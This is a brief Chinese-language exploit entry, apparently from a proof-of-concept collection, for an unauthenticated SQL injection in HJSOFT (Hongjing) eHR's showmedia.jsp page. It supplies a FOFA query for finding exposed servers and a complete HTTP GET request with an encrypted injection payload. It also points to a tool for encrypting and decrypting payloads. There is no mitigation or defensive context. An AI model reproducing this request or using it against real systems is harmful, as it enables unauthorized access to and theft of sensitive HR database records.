## 宏景eHR-showmedia.jsp存在SQL注入漏洞

宏景eHR-showmedia.jsp存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

## fofa

```
app="HJSOFT-HCM"
```

## poc

```
GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9Y5s1xDAUfUx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64MHhzZWM=) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

需要用到工具加解密payload

https://github.com/vaycore/HrmsTool